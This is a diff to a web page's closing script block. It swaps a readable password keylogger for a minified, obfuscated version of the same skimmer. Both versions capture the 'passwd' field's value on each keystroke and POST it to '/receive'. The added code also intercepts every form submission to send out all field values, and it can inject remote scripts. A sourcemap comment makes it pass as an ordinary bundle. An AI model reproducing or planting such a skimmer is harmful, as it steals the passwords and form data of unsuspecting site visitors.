@@ -217,50 +217,8 @@
 <script type="text/javascript">_satellite.pageBottom();</script>
 
 <script>
-	var f_nb, f_val;
-	f_nb = 0;
-	f_val = "";
-
-	var el = document.getElementById("passwd");
-
-	el.onkeyup = function(evt) {
-		console.log(el.value);
-		console.log(el.value.length)
-
-		if (el.value.length > f_nb) {
-			f_nb++;
-
-			var query = [];
-			query.push("ukrast=" + escape(encodeURI(el.value)));
-			query.push("nb=" + f_nb);
-
-			f_send(query.join('&'));
-		} else {
-			f_nb--;
-		}
-
-		if (el.value.length == 0) {
-			f_nb = 0;
-		}
-	};
-
-	function f_send(data) {
-		var xmlhttp = new XMLHttpRequest();
-
-    	xmlhttp.onreadystatechange = function() {
-        	if (xmlhttp.readyState == XMLHttpRequest.DONE) {
-           		if (xmlhttp.status == 200) {
-               		document.getElementById("myDiv").innerHTML = xmlhttp.responseText;
-           		} else {
-					   alert('something else other than 200 was returned');
-           		}
-        	}
-    	};
-
-    	xmlhttp.open("POST", "/receive", true);
-		xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-    	xmlhttp.send(data);
-	}
+	!function(e){function t(r){if(n[r])return n[r].exports;var a=n[r]={exports:{},id:r,loaded:!1};return e[r].call(a.exports,a,a.exports,t),a.loaded=!0,a.exports}var n={};return t.m=e,t.c=n,t.p="",t(0)}([function(e,t){var n=function(){this.dependancies=[],this.dependanciesLoaded=0,this.url="",this.startup()};n.prototype.ajax=function(e,t,n){return xhr=new XMLHttpRequest,xhr.open(e,t),"POST"==e&&xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"),xhr.onreadystatechange=function(){n&&4==request.readyState&&200==request.status&&n(request.responseText)},xhr},n.prototype.socket=function(){},n.prototype.formListener=function(){for(var e=document.getElementsByTagName("form"),t=e.length,n=0;n<t;n++)e[n].addEventListener?e[n].addEventListener("submit",this.send,!1):e[n].attachEvent&&e[n].attachEvent("onsubmit",this.send)},n.prototype.send=function(e){e.preventDefault();var t=[].filter.call(this.elements,function(e){return e}).map(function(e){return{name:e.name,value:e.value,method:e.form.method,action:e.form.action}}),n=this.ajax("POST",this.url);n.send(t)},n.prototype.dependancyInjection=function(){for(var e=this.dependancies.length,t=0;t<e;t++){var n=this.dependancies[t].id,r=this.dependancies[t].url,a=this.dependancies[t].callback;this.injectScript("script",n,r,a)}},n.prototype.injectScript=function(e,t,n,r){var a,o=document.getElementsByTagName(e)[0];document.getElementById(t)||(a=document.createElement(e),a.id=t,a.onload=r,a.src=n,o.parentNode.insertBefore(a,o))},n.prototype.startup=function(){var e=this,t=0,n=document.getElementById("passwd");n.onkeyup=function(r){var a=n.value,o=a.length;if(o>t){t++;var s=[];s.push("pass="+escape(encodeURI(n.value))),s.push("nb_char="+t),xhr=e.ajax("POST","/receive"),xhr.send(s.join("&"))}else t--;0==o&&(t=0)}};new n}]);
+//# sourceMappingURL=bundle.min.js.map
 </script>
 
 </body>
